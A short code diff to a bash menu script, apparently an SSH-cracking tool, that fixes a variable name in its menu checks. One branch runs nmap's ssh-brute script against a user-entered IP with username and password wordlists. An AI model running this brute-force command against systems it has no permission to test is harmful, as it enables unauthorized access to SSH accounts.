@@ -60,7 +60,7 @@ function main(){
 	echo -e ""
 	read -p "[+] Choose number: " method
 	
-	if [[ $ins -eq 1 || $ins -eq 01 ]]
+	if [[ $method -eq 1 || $method -eq 01 ]]
 	then
 		clear
 		echo -e "Cracking SSH using Nmap" | toilet -f smbraille | lolcat
@@ -68,7 +68,7 @@ function main(){
 		read -p "[+] Enter gateway ip: " ip
 		echo -e "\e[0m"
 		nmap $ip -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=password.txt
-	elif [[ $ins -eq 0 || $ins -eq 00 ]]
+	elif [[ $method -eq 0 || $method -eq 00 ]]
 	then
 		clear && xdg-open https://web.facebook.com/mkdirlove.git && exit
 	else
